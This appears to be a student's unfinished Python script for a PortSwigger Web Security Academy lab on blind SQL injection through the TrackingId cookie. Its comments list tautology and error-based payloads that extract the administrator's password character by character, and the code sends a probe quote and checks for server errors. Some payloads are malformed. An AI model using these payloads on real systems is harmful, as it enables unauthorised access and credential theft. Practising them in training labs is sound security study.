import requests

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
PASSWORD_LENGTH = 20

# '
# TrackingId=xyz' OR 1 = 1 --
# OR 1 = (SELECT CASE WHEN SUBSTR(SELECT password FROM users WHERE username = 'administrator'),0,1) = 'a' ELSE 1 END)-- 

#TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

# zx' 1 = (SELECT CASE WHEN (SUBSTR(SELECT password FROM users WHERE username = 'administrator'),0,1) = 'a' THEN 1/0 ELSE 1 END))--

# SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual 


headers = {"Cookie" : "TrackingId=xyz" + "'"}
response = requests.get(FULL_PATH, headers=headers)

if "Internal Server Error" in response.text:
    print("Possible Hit")

